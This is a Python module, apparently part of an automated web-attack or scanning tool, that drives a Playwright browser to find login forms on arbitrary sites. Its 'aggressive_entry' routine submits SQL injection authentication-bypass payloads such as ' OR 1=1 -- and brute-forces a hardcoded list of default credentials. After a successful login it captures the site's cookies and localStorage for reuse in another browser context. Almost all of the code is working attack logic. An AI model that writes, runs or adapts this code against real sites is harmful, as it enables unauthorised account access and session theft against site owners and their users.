import base64
import asyncio
import json
from playwright.async_api import Page, BrowserContext
from src.core.logger import setup_logger

class AuthHandler:
    def __init__(self, logger=None):
        self.logger = logger or setup_logger("AuthHandler")
        self.cookies = None
        self.auth_token = None
        self.default_creds = [
            ("admin", "admin"), ("admin", "password"),
            ("root", "root"), ("user", "user"),
            ("admin", "admin123"), ("admin", "123456")
        ]

    async def find_and_login(self, page: Page, creds: dict) -> bool:
        """[ASYNC] ตรวจหาฟอร์มและพยายาม Login"""
        password_input = page.locator('input[type="password"]')
        
        # ตรวจสอบจำนวน element ต้องใช้ await
        if await password_input.count() > 0:
            self.logger.info(f"[Auth] 🕵️ Potential login form detected at {page.url}")
            return await self.login_with_heuristics(page, creds)
        
        login_indicators = 'a:has-text("Login"), a:has-text("Sign in"), button:has-text("Login"), .login-btn'
        login_btn = page.locator(login_indicators).first
        
        if await login_btn.is_visible():
            try:
                await login_btn.click()
                await page.wait_for_load_state("networkidle")
                return await self.login_with_heuristics(page, creds)
            except: pass
            
        return False

    async def login_with_heuristics(self, page: Page, creds: dict) -> bool:
        """[ASYNC] กรอกข้อมูล Login โดยใช้ Heuristics"""
        try:
            user_selector = 'input[type="text"], input[type="email"], input[name*="user"], input[id*="email"]'
            user_input = page.locator(user_selector).first
            pass_input = page.locator('input[type="password"]').first
            submit_btn = page.locator('button[type="submit"], input[type="submit"], button:has-text("Login")').first

            if await user_input.is_visible() and await pass_input.is_visible():
                await user_input.fill(creds.get("username", "admin"))
                await pass_input.fill(creds.get("password", "admin"))
                
                # ใน Async ใช้ asyncio.gather หรือรอแยกกัน
                await asyncio.gather(
                    page.wait_for_load_state("networkidle"),
                    submit_btn.click()
                )
                
                if await self._check_success(page):
                    await self._capture_session(page)
                    self.logger.info("[Auth] ✅ Login Successful!")
                    return True
        except Exception as e:
            self.logger.debug(f"[Auth] Heuristic Login failed: {e}")
        return False

    async def aggressive_entry(self, page: Page) -> bool:
        """[ASYNC] Brute-force และ SQLi Bypass"""
        if await page.locator('input[type="password"]').count() == 0:
            return False

        self.logger.info(f"[Auth] 🛡️ Attempting Aggressive Entry at {page.url}")
        
        if await self._try_sqli_bypass(page): return True
        if await self._try_default_creds(page): return True
        return False

    async def _try_sqli_bypass(self, page: Page) -> bool:
        payloads = ["' OR 1=1 --", "' OR '1'='1", '" OR 1=1 --']
        user_input = page.locator('input[type="text"], input[type="email"]').first
        pass_input = page.locator('input[type="password"]').first
        submit_btn = page.locator('button[type="submit"], input[type="submit"]').first

        for payload in payloads:
            try:
                await page.reload(wait_until="networkidle") 
                self.logger.info(f"[Auth] Testing SQLi Bypass: {payload}")
                await user_input.fill(payload)
                await pass_input.fill("anything")
                
                await submit_btn.click()
                await page.wait_for_load_state("networkidle")

                if await self._check_success(page):
                    await self._capture_session(page)
                    return True
            except: continue
        return False

    async def _capture_session(self, page: Page):
        """[ASYNC] เก็บ Cookies และ LocalStorage"""
        self.cookies = await page.context.cookies()
        # evaluate ต้องใช้ await
        self.auth_token = await page.evaluate("() => JSON.stringify(localStorage)")
        self.logger.debug("[Auth] Session captured.")

    async def apply_session(self, context: BrowserContext):
        """[ASYNC] โหลด Session เข้า Context ใหม่"""
        if self.cookies:
            await context.add_cookies(self.cookies)
            return True
        return False

    async def _check_success(self, page: Page) -> bool:
        indicators = ["logout", "sign out", "dashboard", "settings", "profile"]
        content = (await page.content()).lower()
        has_indicator = any(ind in content for ind in indicators)
        is_not_login_url = "login" not in page.url.lower()
        return has_indicator and is_not_login_url

    async def _try_default_creds(self, page: Page) -> bool:
        self.logger.info("[Auth] 🔑 Testing default credentials...")
        user_input = page.locator('input[type="text"], input[type="email"], input[name*="user"]').first
        pass_input = page.locator('input[type="password"]').first
        submit_btn = page.locator('button[type="submit"], input[type="submit"]').first

        if not await user_input.is_visible(): return False

        for username, password in self.default_creds:
            try:
                await user_input.fill(username)
                await pass_input.fill(password)
                await submit_btn.click()
                await page.wait_for_load_state("networkidle", timeout=5000)

                if await self._check_success(page):
                    await self._capture_session(page)
                    return True
                
                if "login" not in page.url.lower():
                    await page.go_back()
            except: continue
        return False